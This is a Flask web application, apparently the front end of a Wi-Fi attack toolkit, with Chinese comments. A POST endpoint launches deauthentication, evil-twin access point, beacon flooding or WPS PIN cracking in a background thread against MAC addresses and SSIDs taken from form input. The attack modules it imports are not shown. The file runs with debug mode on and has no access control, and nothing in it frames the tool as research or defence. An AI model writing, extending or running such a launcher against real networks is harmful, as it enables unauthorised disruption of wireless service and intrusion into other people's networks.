from flask import Flask, render_template, request, jsonify
import threading
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from attack.deauth_attack import deauth_attack
from attack.evil_twin import evil_twin_attack
from attack.beacon_flood import beacon_flood
from attack.wps_pin_crack import wps_pin_crack

app = Flask(__name__)
# 启动攻击的线程函数
def run_attack(attack_type, params):
    if attack_type == "deauth":
        return deauth_attack(params['target_mac'], params['ap_mac'], params['iface'])
    elif attack_type == "evil_twin":
        return evil_twin_attack(params['ssid'], params['bssid'], params['iface'])
    elif attack_type == "beacon_flood":
        return beacon_flood(params['iface'])
    elif attack_type == "wps_pin":
        return wps_pin_crack(params['ap_mac'], params['iface'])
    else:
        return "未知攻击类型"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/attack', methods=['POST'])
def attack():
    attack_type = request.form.get('attack_type')
    params = {
        'target_mac': request.form.get('target_mac'),
        'ap_mac': request.form.get('ap_mac'),
        'iface': request.form.get('iface'),
        'ssid': request.form.get('ssid'),
        'bssid': request.form.get('bssid')
    }

    # 在后台启动攻击任务
    attack_thread = threading.Thread(target=run_attack, args=(attack_type, params))
    attack_thread.start()

    return jsonify({"message": f"{attack_type} 攻击已启动", "params": params})

if __name__ == '__main__':
    app.run(debug=True)
